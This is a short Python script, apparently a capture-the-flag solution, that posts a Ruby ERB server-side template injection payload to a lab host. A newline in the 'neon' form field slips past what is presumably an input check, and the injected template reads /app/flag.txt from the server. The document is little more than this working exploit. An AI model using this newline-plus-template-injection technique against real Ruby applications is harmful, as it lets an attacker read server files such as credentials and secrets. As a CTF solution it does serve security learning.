from base64 import b64decode
import requests

# host = 'http://localhost:1337'
host = 'http://178.128.37.153:31612'

code = b64decode

res = requests.post(host, data={
    'neon': "abc\n<%= File.read('/app/flag.txt') %>"
})

print(res.text)
